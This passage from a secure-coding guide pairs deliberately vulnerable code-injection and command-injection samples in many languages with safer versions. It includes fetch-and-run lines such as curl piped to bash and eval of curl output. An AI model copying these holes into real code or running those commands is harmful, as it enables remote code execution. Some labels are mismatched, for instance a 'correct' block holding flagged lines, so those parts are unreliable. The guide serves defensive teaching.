        var x = 1;
    `
    // Static code - SAFE
    vm.runInThisContext(code2)

    // Static script - SAFE
    const script1 = new vm.Script(`
        function add(a, b) {
          return a + b;
        }
    `);
    script1.runInThisContext();
}
```

**Incorrect: JavaScript - vm2 sandbox injection**

```javascript
const {VM, NodeVM} = require('vm2');

async function test1(code, input) {
  code = `
    console.log(${input})
  `;

  // Tainted code in VM - VULNERABLE
  return new VM({
    timeout: 40 * 1000,
    sandbox
  }).run(code);
}

function test2(input) {
  const nodeVM = new NodeVM({timeout: 40 * 1000, sandbox});
  // String concatenation with input - VULNERABLE
  return nodeVM.run('console.log(' + input + ')')
}

// Tainted sandbox - VULNERABLE
async function test1(input) {
  const sandbox = {
    setTimeout,
    watch: input
  };

  return new VM({timeout: 40 * 1000, sandbox}).run(code);
}
```

**Correct: JavaScript - static vm2 code**

```javascript
const {VM, NodeVM} = require('vm2');

async function okTest1(code) {
  code = `
    console.log("Hello world")
  `;

  // Static code - SAFE
  return new VM({
    timeout: 40 * 1000,
    sandbox
  }).run(code);
}

function okTest2() {
  const nodeVM = new NodeVM({timeout: 40 * 1000, sandbox});
  // Static string - SAFE
  return nodeVM.run('console.log("Hello world")')
}
```

**Incorrect: JavaScript - Express template injection SSTI**

```javascript
app.get('/', function(req, res) {
    let tainted = req.query.id;

    // User data in template compilation - VULNERABLE
    pug.compile(tainted);
    pug.render(tainted);
    jade.compile(tainted);
    jade.render(tainted);
    dot.template(tainted);
    ejs.render(tainted);
    nunjucks.renderString(tainted);
    lodash.template(tainted);
    dot.compile(tainted);
    handlebars.compile(req.query.id);
    mustache.render(req.body._);
    Hogan.compile(tainted);
    Eta.render(tainted);
    Sqrl.render(tainted);
});
```

**Incorrect: JavaScript - AWS Lambda eval injection**

```javascript
exports.handler = async (event) => {
    // Event data in eval - VULNERABLE
    eval(event['smth'])

    var x = new Function('a', 'b', `return ${event['func']}(a,b)`)

    var y = Function('a', 'b', event['code'])
}
```

**Correct: JavaScript - AWS Lambda static eval**

```javascript
exports.handler = async (event) => {
    // Static eval is safe
    eval('alert')
}
```

**Incorrect: Ruby - dangerous eval**

```ruby
# Tainted cookie in eval - VULNERABLE
Array.class_eval(cookies['tainted_cookie'])

b = params['something']
# User input in module_eval - VULNERABLE
Thing.module_eval(b)

# Direct param access - VULNERABLE
eval(b)
eval(b,some_binding)
eval(params['cmd'],b)
eval(params.dig('cmd'))
eval(cookies.delete('foo'))

# Dynamic RubyVM compilation - VULNERABLE
RubyVM::InstructionSequence.compile(foo).eval

iseq = RubyVM::InstructionSequence.compile(foo)
iseq.eval
```

**Correct: Ruby - static eval**

```ruby
def zen
  41
end

# Static eval is safe
eval("def zen; 42; end")

class Thing
end
a = %q{def hello() "Hello there!" end}
# Not user-controllable, this is safe
Thing.module_eval(a)

def get_binding(param)
  binding
end
b = get_binding("hello")
# Static function call is safe
b.eval("some_func")

eval("some_func",b)

# Static RubyVM compilation is safe
RubyVM::InstructionSequence.compile("1 + 2").eval

iseq = RubyVM::InstructionSequence.compile('num = 1 + 2')
iseq.eval
```

**Incorrect: Ruby - unsafe reflection with constantize**

```ruby
class HomeController < ApplicationController

  def unsafe_reflection
    table = params["table"]
    # User controls which class is instantiated - VULNERABLE
    model = table.classify.constantize
    @result = model.send(:method)
  end
end
```

**Correct: Ruby - static string reflection**

```ruby
class HomeController < ApplicationController

  def ok_reflection
    foo = "SomeClass"
    # Static string is safe
    foo.classify.constantize
  end
end
```

**Incorrect: Ruby - unsafe reflection with tap/method/to_proc**

```ruby
class GroupsController < ApplicationController

  def dynamic_method_invocations
    # User input to to_proc - VULNERABLE
    params[:method].to_sym.to_proc.call(Kernel)

    # User input to method() - VULNERABLE
    (params[:klass].to_s).method(params[:method]).(params[:argument])

    # User input to tap - VULNERABLE
    Kernel.tap(&params[:method].to_sym)

    user_input_value = params[:my_user_input]
    anything.tap(&user_input_value.to_sym)
    anything_else.tap { |thing| thing + user_input_value() }
  end
end
```

**Correct: Ruby - static strings in reflection methods**

```ruby
class GroupsController < ApplicationController

  def dynamic_method_invocations_ok
    # Static strings are safe
    "SomeClass".to_sym.to_proc.call(Kernel)
    SomeClass.method("some_method").("some_argument")
    Kernel.tap("SomeClass".to_sym)

    user_input_value = params[:my_user_input]
    # Calling method on user input (not with user input) is safe
    user_input_value.tap("some_method")
  end
end
```

**Incorrect: Ruby - dangerous send with user input**

```ruby
def bad_send
    method = params[:method]
    # User controls which method is called - VULNERABLE
    @result = User.send(method.to_sym)
end
```

**Correct: Ruby - validated send with ternary**

```ruby
def ok_send
    # Ternary ensures only known methods are called - SAFE
    method = params[:method] == 1 ? :method_a : :method_b
    @result = User.send(method, *args)
end
```

**Incorrect: Ruby - dangerous exec/spawn/system**

```ruby
def test_params()
  user_input = params['some_key']

  # String interpolation with user input - VULNERABLE
  exec("ls -lah #{user_input}")
  Process.spawn([user_input, "smth"])
  output = exec(["sh", "-c", user_input])
  pid = spawn(["bash", user_input])
end

def test_cookies()
  user_input = cookies['some_cookie']
  exec("ls -lah #{user_input}")
end
```

**Correct: Ruby - static exec/spawn/system commands**

```ruby
def test_params()
  commands = "ls -lah /raz/dva"
  # Static commands are safe
  system(commands)

  cmd_name = "sh"
  Process.exec([cmd_name, "ls", "-la"])
  Open3.capture2({"FOO" => "BAR"}, [cmd_name, "smth"])
  system("ls -lah /tmp")
  exec(["ls", "-lah", "/tmp"])
end
```

**Incorrect: Ruby - dangerous subshell with interpolation**

```ruby
def test_calls(user_input)
  # Backticks with interpolation - VULNERABLE
  result = `foo #{user_input} bar`
  result2 = %x{foo #{user_input} bar}
  cmd = `foo #{user_input} bar #{smth_else}`
end
```

**Correct: Ruby - static subshell commands**

```ruby
def test_calls(user_input)
  # Static commands are safe
  smth = `ls testdir`.split[1]
  ok_cmd = `echo oops && exit 99`

  hardcode = "testdir"
  ok_cmd2 = %{ls #{hardcode} -lah}
end
```

**Incorrect: Ruby - Marshal cookie serialization**

```ruby
class Bad_cookie_serialization
  # Marshal deserialization is dangerous - VULNERABLE
  Rails.application.config.action_dispatch.cookies_serializer = :hybrid
  Rails.application.config.action_dispatch.cookies_serializer = :marshal
end
```

**Correct: Ruby - JSON cookie serialization**

```ruby
class Cookie_serialization
  # JSON serialization is safe
  Rails.application.config.action_dispatch.cookies_serializer = :json
end
```

**Incorrect: Java - ScriptEngine injection**

```java
public class ScriptEngineSample {

    private static ScriptEngineManager sem = new ScriptEngineManager();
    private static ScriptEngine se = sem.getEngineByExtension("js");

    // User input in script evaluation - VULNERABLE
    public static void scripting(String userInput) throws ScriptException {
        Object result = se.eval("test=1;" + userInput);
    }

    public static void scripting1(String userInput) throws ScriptException {
        ScriptEngineManager scriptEngineManager = new ScriptEngineManager();
        ScriptEngine scriptEngine = scriptEngineManager.getEngineByExtension("js");
        Object result = scriptEngine.eval("test=1;" + userInput);
    }
}
```

**Correct: Java - static ScriptEngine evaluation**

```java
public class ScriptEngineSample {

    // Static script is safe
    public static void scriptingSafe() throws ScriptException {
        ScriptEngineManager scriptEngineManager = new ScriptEngineManager();
        ScriptEngine scriptEngine = scriptEngineManager.getEngineByExtension("js");
        String code = "var test=3;test=test*2;";
        Object result = scriptEngine.eval(code);
    }
}
```

**Incorrect: Java - Spring Expression Language SpEL injection**

```java
public class SpelSample {

    // User input in SpEL expression - VULNERABLE
    public static void parseExpressionInterface1(String property) {
        ExpressionParser parser = new SpelExpressionParser();
        StandardEvaluationContext testContext = new StandardEvaluationContext(TEST_PERSON);
        Expression exp2 = parser.parseExpression(property+" == 'Benoit'");
        String dynamicValue = exp2.getValue(testContext, String.class);
    }

    public static void parseSpelExpression3(String property) {
        SpelExpressionParser parser = new SpelExpressionParser();
        StandardEvaluationContext testContext = new StandardEvaluationContext(TEST_PERSON);
        Expression exp2 = parser.parseExpression(property+" == 'Benoit'");
    }
}
```

**Correct: Java - static SpEL expression**

```java
public class SpelSample {

    // Static expression is safe
    public static void parseExpressionInterface2(String property) {
        ExpressionParser parser = new SpelExpressionParser();
        Expression exp1 = parser.parseExpression("'safe expression'");
        String constantValue = exp1.getValue(String.class);
    }
}
```

**Incorrect: Java - OGNL injection**

```java
public class OgnlReflectionProviderSample {

    // User input in OGNL - VULNERABLE
    public void unsafeOgnlReflectionProvider(String input, OgnlReflectionProvider reflectionProvider, Class type) {
        reflectionProvider.getGetMethod(type, input);
    }

    public void unsafeOgnlReflectionProvider1(String input, ReflectionProvider reflectionProvider) {
        reflectionProvider.getValue(input, null, null);
    }

    public void unsafeOgnlReflectionProvider3(String input, OgnlTextParser reflectionProvider) {
        reflectionProvider.evaluate( input );
    }
}
```

**Correct: Java - static OGNL input**

```java
public class OgnlReflectionProviderSample {

    // Static input is safe
    public void safeOgnlReflectionProvider1(OgnlReflectionProvider reflectionProvider, Class type) {
        String input = "thisissafe";
        reflectionProvider.getGetMethod(type, input);
    }

    public void safeOgnlReflectionProvider2(OgnlReflectionProvider reflectionProvider, Class type) {
        reflectionProvider.getField(type, "thisissafe");
    }
}
```

**Incorrect: Java - Expression Language EL injection**

```java
public class ElExpressionSample {

    // User input in EL expression - VULNERABLE
    public void unsafeEL(String expression) {
        FacesContext context = FacesContext.getCurrentInstance();
        ExpressionFactory expressionFactory = context.getApplication().getExpressionFactory();
        ELContext elContext = context.getELContext();
        ValueExpression vex = expressionFactory.createValueExpression(elContext, expression, String.class);
        String result = (String) vex.getValue(elContext);
    }

    public void unsafeELMethod(ELContext elContext, ExpressionFactory expressionFactory, String expression) {
        expressionFactory.createMethodExpression(elContext, expression, String.class, new Class[]{Integer.class});
    }

    private void unsafeELTemplate(String message, ConstraintValidatorContext context) {
         context.disableDefaultConstraintViolation();
         context
             .someMethod()
             .buildConstraintViolationWithTemplate(message)
             .addConstraintViolation();
    }
}
```

**Correct: Java - static EL expression**

```java
public class ElExpressionSample {

    // Static expression is safe
    public void safeEL() {
        FacesContext context = FacesContext.getCurrentInstance();
        ExpressionFactory expressionFactory = context.getApplication().getExpressionFactory();
        ELContext elContext = context.getELContext();
        ValueExpression vex = expressionFactory.createValueExpression(elContext, "1+1", String.class);
        String result = (String) vex.getValue(elContext);
    }

    private void safeELTemplate(String message, ConstraintValidatorContext context) {
         context.disableDefaultConstraintViolation();
         context
             .someMethod()
             .buildConstraintViolationWithTemplate("somestring")
             .addConstraintViolation();
    }
}
```

**Incorrect: Java - Groovy shell injection**

```java
public class GroovyShellUsage {

    public static void test1(String uri, String file, String script) {
        GroovyShell shell = new GroovyShell();

        // User input in evaluate - VULNERABLE
        shell.evaluate(new File(file));
        shell.evaluate(new InputStreamReader(new FileInputStream(file)), "script1.groovy");
        shell.evaluate(script);
        shell.evaluate(script, "script1.groovy", "test");
        shell.evaluate(new URI(uri));
    }

    public static void test2(String uri, String file, String script) {
        GroovyShell shell = new GroovyShell();

        // User input in parse - VULNERABLE
        shell.parse(new File(file));
        shell.parse(script);
        shell.parse(new URI(uri));
    }

    public static void test3(String script, ClassLoader loader) {
        GroovyClassLoader groovyLoader = (GroovyClassLoader) loader;

        // User input in parseClass - VULNERABLE
        groovyLoader.parseClass(script);
        groovyLoader.parseClass(script,"test.groovy");
    }
}
```

**Correct: Java - static Groovy shell scripts**

```java
public class GroovyShellUsage {

    public static void test1() {
        GroovyShell shell = new GroovyShell();
        // Static script is safe
        shell.evaluate("hardcoded script");
    }

    public static void test2() {
        GroovyShell shell = new GroovyShell();
        String hardcodedScript = "test.groovy";
        // Hardcoded path is safe
        shell.parse(hardcodedScript);
    }
}
```

**Incorrect: Java - Seam log injection**

```java
public class HttpRequestDebugFilter implements Filter {
    Log log = Logging.getLog(HttpRequestDebugFilter.class);

    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) {
        if (request instanceof HttpServletRequest) {
            HttpServletRequest httpRequest = (HttpServletRequest)request;
            // String concatenation in log - VULNERABLE (EL evaluation)
            log.info("request: method="+httpRequest.getMethod()+", URL="+httpRequest.getRequestURI());
        }
    }

    public void logUser(User user) {
        // User data in string concatenation - VULNERABLE
        log.info("Current logged in user : " + user.getUsername());
    }
}
```

**Correct: Java - parameterized Seam logging**

```java
public class HttpRequestDebugFilter implements Filter {
    Log log = Logging.getLog(HttpRequestDebugFilter.class);

    public void logUser(User user) {
        // Parameterized logging prevents EL injection - SAFE
        log.info("Current logged in user : #0", user.getUsername());
    }
}
```

**Incorrect: Go - dangerous exec.Command with user input**

```go
func runCommand1(userInput string) {
    // User controls command - VULNERABLE
    cmd := exec.Command(userInput, "foobar")
    cmd.Run()
}

func runCommand2(userInput string) {
    execPath, _ := exec.LookPath(userInput)
    // User controls path lookup - VULNERABLE
    cmd := exec.Command(execPath, "foobar")
    cmd.Run()
}

func runCommand4(userInput string) {
    // User input passed to shell - VULNERABLE
    cmd := exec.Command("bash", "-c", userInput)
    cmd.Run()
}

func runcommand5(s string) (string, error) {
    // Function parameter in shell command - VULNERABLE
    cmd := exec.Command("/usr/bin/env", "bash", "-c", s)
    return cmd.CombinedOutput()
}
```

**Correct: Go - static exec.Command**

```go
func okCommand1(userInput string) {
    goExec, _ := exec.LookPath("go")
    // Static command is safe
    cmd := exec.Command(goExec, "version")
    cmd.Run()
}

func okCommand2(userInput string) {
    // Static command is safe
    cmd := exec.Command("go", "version")
    cmd.Run()
}

func okCommand3(s string) (string, error) {
    someCommand := "w"
    // Hardcoded command is safe
    cmd := exec.Command("/usr/bin/env", "bash", "-c", someCommand)
    return cmd.CombinedOutput()
}
```

**Incorrect: Go - dangerous exec.Cmd struct with user input**

```go
func test1(userInput string) {
    cmdPath,_ := userInput;

    // User controls Path - VULNERABLE
    cmd := &exec.Cmd {
        Path: cmdPath,
        Args: []string{ "foo", "bar" },
    }
    cmd.Start();
}

func test3(userInput string) {
    cmdPath,_ := exec.LookPath("bash");

    // User controls Args - VULNERABLE
    cmd := &exec.Cmd {
        Path: cmdPath,
        Args: []string{ cmdPath, "-c", userInput },
    }
    cmd.Start();
}
```

**Correct: Go - static exec.Cmd struct**

```go
func okTest1(userInput string) {
    cmdPath,_ := exec.LookPath("go");

    // Static path and args are safe
    cmd := &exec.Cmd {
        Path: cmdPath,
        Args: []string{ cmdPath, "bar" },
    }
    cmd.Start();
}
```

**Incorrect: Go - dangerous syscall.Exec with user input**

```go
func test1(userInput string) {
    // User controls binary path - VULNERABLE
    binary, _ := exec.LookPath(userInput)
    args := []string{"ls", "-a", "-l", "-h"}
    env := os.Environ()
    syscall.Exec(binary, args, env)
}

func test2(userInput string) {
    binary, _ := exec.LookPath("sh")
    // User controls args - VULNERABLE
    args := []string{userInput, "-a", "-l", "-h"}
    syscall.Exec(binary, args, env)
}

func test3(userInput string) {
    binary, _ := exec.LookPath("sh")
    // User input passed to shell - VULNERABLE
    args := []string{binary, "-c", userInput}
    syscall.Exec(binary, args, env)
}
```

**Correct: Go - static syscall.Exec**

```go
func okTest1(userInput string) {
    // Static command is safe
    binary, _ := exec.LookPath("ls")
    args := []string{"ls", "-a", "-l", "-h"}
    env := os.Environ()
    syscall.Exec(binary, args, env)
}
```

**Incorrect: Go - Otto VM injection**

```go
func whyyyy(w http.ResponseWriter, r *http.Request) {
    r.ParseForm()
    script := r.Form.Get("script")

    vm := otto.New()

    // User script in VM - VULNERABLE
    vm.Run(script)
}
```

**Correct: Go - static Otto VM script**

```go
func main() {
    vm := otto.New()
    // Static script is safe
    vm.Run(`
        abc = 2 + 2;
        console.log("The value of abc is " + abc);
    `)
}
```

**Incorrect: PHP - dangerous exec functions with user input**

```php
// User input in exec - VULNERABLE
exec($user_input);
passthru($user_input);
$proc = proc_open($cmd, $descriptorspec, $pipes);
$handle = popen($user_input, "r");
$output = shell_exec($user_input);
$output = system($user_input, $retval);
pcntl_exec($path);

// Tainted exec - VULNERABLE
$username = $_COOKIE['username'];
exec("wto -n \"$username\" -g", $ret);

$jobName = $_REQUEST['jobName'];
$cmd = sprintf("rsyncmd -l \"$xmlPath\" -r %s >/dev/null", $jobName);
system($cmd);
```

**Correct: PHP - static commands with escapeshellarg**

```php
// Static command is safe
exec('whoami');

// escapeshellarg prevents injection - SAFE
$fullpath = $_POST['fullpath'];
$filesize = trim(shell_exec('stat -c %s ' . escapeshellarg($fullpath)));

// All user inputs escaped - SAFE
$errorCode = escapeshellarg($_POST['errorCode']);
$func = escapeshellarg($_POST['func']);
$logsCmd = sprintf('%s%s%s',
  "wdlog -l INFO -s 'adminUI' function:string=$func ",
  "errorCode:string=$errorCode ",
  "corid:string='AUI:$uuid' >/dev/null 2>&1"
);
exec($logsCmd);
```

**Incorrect: PHP - dangerous assert with user input**

```php
$tainted = $_GET['userinput'];

// User input in assert - VULNERABLE (equivalent to eval)
assert($tainted);

Route::get('bad', function ($name) {
  assert($name);
});
```

**Correct: PHP - static assert**

```php
// Static assertion is safe
assert('2 > 1');
```

**Incorrect: PHP - backticks with user input**

```php
// Backticks with user input - VULNERABLE
echo `ping -n 3 {$user_input}`;
```

**Incorrect: C# - Razor template injection**

```csharp
public class HomeController : Controller
{
    [HttpPost]
    [ValidateInput(false)]
    public ActionResult Index(string inert, string razorTpl)
    {
        // User input directly in Razor.Parse - VULNERABLE
        ViewBag.RenderedTemplate = Razor.Parse(razorTpl);
        return View();
    }
}
```

**Correct: C# - sanitized Razor template**

```csharp
public class HomeController : Controller
{
    [HttpPost]
    [ValidateInput(false)]
    public ActionResult Index(string inter, string razorTpl)
    {
        // Sanitize/transform input before parsing
        var junk = someFunction(razorTpl);
        ViewBag.RenderedTemplate = Razor.Parse(junk);
        return View();
    }
}
```

**Incorrect: Scala - ScalaJS eval with user input**

```scala
object Smth {
  def call1(code: String) = {
    // String interpolation in eval - VULNERABLE
    js.eval(s"console.log($code)")
    true
  }
}

object FooBar {
  def call2(code: String) = {
    // String concatenation in eval - VULNERABLE
    js.eval("console.log(" + code +")")
    true
  }
}
```

**Correct: Scala - static ScalaJS eval**

```scala
object Smth {
  def call1(code: String) = {
    // Static eval is safe
    js.eval("FooBar()")
    true
  }
}
```

**Incorrect: Bash - curl pipe to bash**

```bash
# All of these are VULNERABLE
bash <(curl -Ls "https://raw.githubusercontent.com/pusox/pusox/main/script/_A.sh")

curl http://10.110.1.200/deployment/scripts/setup.bash | /bin/bash -x

curl http://10.110.1.200/deployment/scripts/setup.bash | sudo /bin/bash

/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

**Correct: Bash - download, verify, then execute**

```bash
# Download first, verify, then execute - SAFER
curl http://10.110.1.200/deployment/scripts/setup.bash -o setup.bash
# Verify checksum here
sha256sum -c setup.bash.sha256
bash setup.bash
```

**Incorrect: Bash - curl eval**

```bash
x=$(curl -L https://raw.githubusercontent.com/something)
# Eval'ing curl output - VULNERABLE
eval ${x}

yy=`curl $SOME_URL`
eval ${yy}

# Direct eval of curl - VULNERABLE
eval $(curl -L https://raw.githubusercontent.com/something)
```

**Correct: Bash - static eval**

```bash
# Static eval is safe
eval "x=1"
```

- [OWASP Code Injection](https://owasp.org/www-community/attacks/Code_Injection)

- [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)

- [CWE-94: Improper Control of Generation of Code](https://cwe.mitre.org/data/definitions/94.html)

- [CWE-95: Eval Injection](https://cwe.mitre.org/data/definitions/95.html)

- [MDN: Never use eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval#never_use_eval!)

- [Python eval() is dangerous](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)

- [Node.js VM module security warning](https://nodejs.org/api/vm.html#vm_vm_executing_javascript)

- [Flask/Jinja2 SSTI](https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html)

- [Spring Expression Language Injection](https://owasp.org/Top10/A03_2021-Injection)

- [Trojan Source - Bidirectional Character Attacks](https://trojansource.codes/)

### 0.10 Prevent Command Injection

**Impact: CRITICAL (Remote code execution allowing attackers to run arbitrary commands on the host system)**

Command injection occurs when untrusted input is passed to system shell commands. Attackers can execute arbitrary commands on the host system, potentially downloading malware, stealing data, or taking complete control of the server.

**Incorrect: vulnerable to command injection via os.system**

```python
import os
import flask

app = flask.Flask(__name__)

@app.route("/route_param/<route_param>")
def route_param(route_param):
    # ruleid: os-system-injection
    return os.system(route_param)

@app.route("/route_param_concat/<route_param>")
def route_param_concat(route_param):
    # ruleid: os-system-injection
    return os.system("echo " + route_param)

@app.route("/route_param_format/<route_param>")
def route_param_format(route_param):
    # ruleid: os-system-injection
    return os.system("echo {}".format(route_param))
```

**Correct: safe alternatives**

```python
import os
import flask

app = flask.Flask(__name__)

@app.route("/ok")
def ok():
    # ok: os-system-injection
    os.system("This is fine")

@app.route("/route_param_ok/<route_param>")
def route_param_ok(route_param):
    # ok: os-system-injection
    return os.system("ls -la")
```

**Incorrect: vulnerable to command injection via subprocess**

```python
import subprocess
import flask

app = flask.Flask(__name__)

@app.route("a")
def a():
    ip = flask.request.args.get("ip")
    # ruleid: subprocess-injection
    subprocess.run("ping "+ ip)

@app.route("b")
def b():
    host = flask.request.headers["HOST"]
    # ruleid: subprocess-injection
    subprocess.run("echo {} > log".format(host))

@app.route("f")
def f():
    event = flask.request.get_json()
    # ruleid: subprocess-injection
    subprocess.run(["bash", "-c", event['id']], shell=True)
```

**Correct: safe subprocess usage**

```python
import subprocess
import flask

app = flask.Flask(__name__)

@app.route("ok")
def ok():
    ip = flask.request.args.get("ip")
    # ok: subprocess-injection
    subprocess.run(["ping", ip])

@app.route("ok2")
def ok2():
    ip = flask.request.args.get("ip")
    # ok: subprocess-injection
    subprocess.run("echo 'nothing'")

@app.route("d_ok/<cmd>/<ip>")
def d_ok(cmd, ip):
    # ok: subprocess-injection
    subprocess.capture_output(["ping", cmd, ip])
```

**Incorrect: subprocess with shell=True**

```python
import subprocess
import sys

# ruleid: subprocess-shell-true
subprocess.call("grep -R {} .".format(sys.argv[1]), shell=True)

# ruleid: subprocess-shell-true
subprocess.run("grep -R {} .".format(sys.argv[1]), shell=True)
```

**Correct: avoid shell=True**

```python
import subprocess
import sys

# ok: subprocess-shell-true
subprocess.call("echo 'hello'")

# ok: subprocess-shell-true
subprocess.call("echo 'hello'", shell=True)  # safe with static string
```

**Incorrect: dangerous os.spawn**

```python
import os
import sys

cmd = sys.argv[2]

# ruleid: dangerous-spawn-process
os.spawnlp(os.P_WAIT, cmd)

# ruleid: dangerous-spawn-process
os.spawnve(os.P_WAIT, "/bin/bash", ["-c", cmd], os.environ)
```

**Correct: safe os.spawn usage**

```python
import os

# ok: dangerous-spawn-process
os.spawnlp(os.P_WAIT, "ls")

# ok: dangerous-spawn-process
os.spawnv(os.P_WAIT, "/bin/ls")
```

---

**Incorrect: vulnerable child_process**

```javascript
const {exec, spawnSync} = require('child_process');
const cp = require('child_process');

function a(args) {
  // ruleid: detect-child-process
  exec(`cat *.js ${args[0]}| wc -l`, (error, stdout, stderr) => {
    console.log(stdout)
  });
}

function a(userInput) {
  // ruleid: detect-child-process
  cp.spawnSync(userInput);
}
```

**Correct: safe child_process usage**

```javascript
const {spawn, spawnSync} = require('child_process');

// ruleid: spawn-shell-true
const ls = spawn('ls', ['-lh', '/usr'], {shell: true});

// ruleid: spawn-shell-true
const pid = spawnSync('ls', ['-lh', '/usr'], {shell: '/bin/sh'});
```

**Incorrect (dangerous spawn with shell: true):**

**Correct: spawn without shell**

```javascript
const {spawn, spawnSync} = require('child_process');

// ok: spawn-shell-true
spawn('ls', ['-lh', '/usr'], {shell: false});

// ok: spawn-shell-true
spawn('ls', ['-lh', '/usr'], {});
```

**Incorrect: dangerous spawn shell execution**

```javascript
const {spawn, spawnSync} = require('child_process');
const cp = require('child_process');

function test1(userInput) {
    let name = "bash";
    // ruleid: dangerous-spawn-shell
    spawnSync(name, ["-c", userInput]);
}

function test2(userInput) {
    // ruleid: dangerous-spawn-shell
    cp.spawn('sh', [userInput]);
}
```

**Correct: safe spawn usage**

```javascript
const {spawn} = require('child_process');

function testOk(userInput) {
    foobar(userInput);
    // ok: dangerous-spawn-shell
    spawn('ls', ['-la', '/tmp']);
}
```

**Incorrect: git clone with user-controlled URL**

```javascript
const { spawn } = require('child_process');

function downloadGitCommit(gitBranch, gitUrl, sourceCodePath) {
    // ruleid: spawn-git-clone
    const gitClone = spawn('git', [
        'clone',
        '--branch', gitBranch,
        '--depth', '1',
        gitUrl,
        sourceCodePath
    ]);
    return gitClone;
}
```

**Correct: hardcoded git URL**

```javascript
const { spawn } = require('child_process');

function downloadGitCommitOk() {
    // ok: spawn-git-clone
    const gitClone = spawn('git', [ 'clone', 'https://hardcoded-url.com' ]);
    return res.send('ok');
}
```

**Incorrect: shelljs exec injection**

```javascript
const shell = require('shelljs');

function test1(userInput) {
    // ruleid: shelljs-exec-injection
    return shell.exec(userInput, {silent: true})
}

function test2(userInput) {
    const input = `ls ${userInput}`
    // ruleid: shelljs-exec-injection
    return shell.exec(input, {silent: true})
}
```

**Correct: safe shelljs usage**

```javascript
const shell = require('shelljs');

function okTest3(userInput) {
    // ok: shelljs-exec-injection
    const input = 'ls ./'
    return shell.exec(input, {silent: true})
}
```

**Incorrect: Deno dangerous run**

```javascript
async function test1(userInput) {
  const p = Deno.run({
    // ruleid: deno-dangerous-run
    cmd: [userInput, "hello"],
    stdout: "piped",
    stderr: "piped",
  });

  await p.status();
}

async function test2(userInput) {
  const p = Deno.run({
    // ruleid: deno-dangerous-run
    cmd: ["bash", "-c", userInput],
    stdout: "piped",
    stderr: "piped",
  });

  await p.status();
}
```

**Correct: safe Deno.run**

```javascript
async function okTest() {
  const p = Deno.run({
    cmd: ["echo", "hello"],
  });

  await p.status();
}
```

---

**Incorrect: ProcessBuilder with user input**

```java
public class TestExecutor {

    private Pair<Integer, String> test1(String command, Logger logAppender) throws IOException {
      String[] cmd = new String[3];
      String osName = System.getProperty("os.name");
      if (osName.startsWith("Windows")) {
          cmd[0] = "cmd.exe";
          cmd[1] = "/C";
      } else {
          cmd[0] = "/bin/bash";
          cmd[1] = "-c";
      }
      cmd[2] = command;

      // ruleid: command-injection-process-builder
      ProcessBuilder builder = new ProcessBuilder(cmd);
      builder.redirectErrorStream(true);
      Process proc = builder.start();
      return Pair.newPair(1, "Killed");
    }

    public String test2(String userInput) {
      ProcessBuilder builder = new ProcessBuilder();
      // ruleid: command-injection-process-builder
      builder.command(userInput);
      return "foo";
    }

    public String test3(String userInput) {
      ProcessBuilder builder = new ProcessBuilder();
      // ruleid: command-injection-process-builder
      builder.command("bash", "-c", userInput);
      return "foo";
    }
}
```

**Correct: safe ProcessBuilder usage**

```java
public class TestExecutor {

    public String okTest() {
      ProcessBuilder builder = new ProcessBuilder();
      // ok: command-injection-process-builder
      builder.command("bash", "-c", "ls");
      return "foo";
    }
}
```

**Incorrect: Runtime.exec with formatted string**

```java
import java.lang.Runtime;

class Cls {

    public Cls(String input) {
        Runtime r = Runtime.getRuntime();
        // ruleid: command-injection-formatted-runtime-call
        r.exec("/bin/sh -c some_tool" + input);
    }

    public void test1(String input) {
        Runtime r = Runtime.getRuntime();
        // ruleid: command-injection-formatted-runtime-call
        r.loadLibrary(String.format("%s.dll", input));
    }

    public void test2(String input) {
        // ruleid: command-injection-formatted-runtime-call
        Runtime.getRuntime().exec("bash", "-c", input);
    }
}
```

**Correct: safe Runtime usage**

```java
import java.lang.Runtime;

class Cls {

    public void okTest(String input) {
        Runtime r = Runtime.getRuntime();
        // ok: command-injection-formatted-runtime-call
        r.exec("echo 'blah'");
    }

    public void okTest2(String input) {
        // ok: command-injection-formatted-runtime-call
        Runtime.getRuntime().loadLibrary("lib.dll");
    }
}
```

**Incorrect: tainted HTTP request to command**

```java
@WebServlet(value = "/cmdi-00/BenchmarkTest00006")
public class bad1 extends HttpServlet {

    @Override
    public void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String param = "";
        if (request.getHeader("BenchmarkTest00006") != null) {
            param = request.getHeader("BenchmarkTest00006");
        }

        java.util.List<String> argList = new java.util.ArrayList<String>();
        argList.add("sh");
        argList.add("-c");
        // ruleid: tainted-cmd-from-http-request
        argList.add("echo " + param);

        ProcessBuilder pb = new ProcessBuilder();
        pb.command(argList);
        Process p = pb.start();
    }
}
```

**Correct: safe command construction**

```java
@WebServlet(value = "/cmdi-00/BenchmarkTest00006")
public class ok1 extends HttpServlet {

    @Override
    public void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        java.util.List<String> argList = new java.util.ArrayList<String>();
        argList.add("sh");
        argList.add("-c");
        // ok: tainted-cmd-from-http-request
        argList.add("echo " + "param");

        ProcessBuilder pb = new ProcessBuilder();
        pb.command(argList);
        Process p = pb.start();
    }
}
```

---

**Incorrect: Process.Start with user input**

```csharp
using System.Diagnostics;

namespace Injections
{
    public class OsCommandInjection
    {
        public void RunOsCommand(string command)
        {
            // ruleid: os-command-injection
            var process = Process.Start(command);
        }

        public void RunOsCommandWithArgs(string command, string arguments)
        {
            // ruleid: os-command-injection
            var process = Process.Start(command, arguments);
        }

        public void RunOsCommandWithProcessParam(string command)
        {
            Process process = new Process();
            process.StartInfo.FileName = command;
            // ruleid: os-command-injection
            process.Start();
        }

        public void RunOsCommandWithStartInfo(string command)
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo()
            {
                FileName = command
            };
            // ruleid: os-command-injection
            var process = Process.Start(processStartInfo);
        }
    }
}
```

**Correct: safe Process.Start usage**

```csharp
using System.Diagnostics;

namespace Injections
{
    public class OsCommandInjection
    {
        public void RunOsCommand(string command)
        {
            // ok: os-command-injection
            var process = Process.Start("constant");
        }

        public void RunOsCommandWithArgs(string command, string arguments)
        {
            // ok: os-command-injection
